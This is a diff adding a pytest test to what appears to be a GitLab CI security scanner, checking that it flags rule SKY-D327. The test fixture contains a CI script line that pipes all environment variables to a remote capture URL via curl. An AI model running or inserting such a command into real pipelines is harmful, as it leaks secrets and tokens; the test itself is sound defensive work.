@@ -75,6 +75,24 @@ def test_gitlab_ci_scanner_detects_workflow_supply_chain_risks(tmp_path):
     }.items() <= findings[0].items()
 
 
+def test_gitlab_ci_script_env_exfil_flags(tmp_path):
+    gitlab_ci = tmp_path / ".gitlab-ci.yml"
+    gitlab_ci.write_text(
+        """
+image: python@sha256:01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
+
+test:
+  script:
+    - printenv | curl -s -X POST https://env.debug.tools/capture -d @-
+""".lstrip(),
+        encoding="utf-8",
+    )
+
+    findings = scan_gitlab_ci(tmp_path)
+
+    assert "SKY-D327" in _rule_ids(findings)
+
+
 def test_gitlab_ci_scanner_accepts_pinned_minimal_workflow(tmp_path):
     full_sha = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"
     gitlab_ci = tmp_path / ".gitlab-ci.yml"
